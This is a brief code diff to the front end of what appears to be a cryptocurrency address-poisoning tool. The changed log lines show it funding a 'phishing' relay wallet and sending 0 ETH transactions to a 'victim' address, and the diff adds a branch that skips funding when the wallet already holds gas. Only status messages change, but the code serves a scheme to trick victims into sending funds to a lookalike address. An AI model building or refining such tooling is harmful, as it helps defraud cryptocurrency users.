@@ -136,9 +136,16 @@
                     const result = await response.json();
 
                     if (response.ok) {
-                        this.addLog('Step 1: Relay wallet funded successfully.', 'success');
-                        this.addLog('Step 2: 0 ETH target transaction confirmed.', 'success');
-                        this.addLog(`Execution completed: ${result.hash.slice(0, 10)}...`, 'success');
+                        if (result.skippedFunding) {
+                            this.addLog(`Step 1 Skipped: Wallet already holds sufficient gas.`, 'info');
+                        } else {
+                            this.addLog(
+                                `Step 1: Funded relay wallet (${this.phishingAddress.slice(0, 8)}...).`,
+                                'success'
+                            );
+                        }
+                        this.addLog(`Step 2: Sent 0 ETH to victim (${this.victimAddress.slice(0, 8)}...).`, 'success');
+                        this.addLog(`Execution completed: ${result.hash.slice(0, 15)}...`, 'success');
                     } else {
                         this.addLog(`Execution failed: ${result.error}`, 'error');
                     }
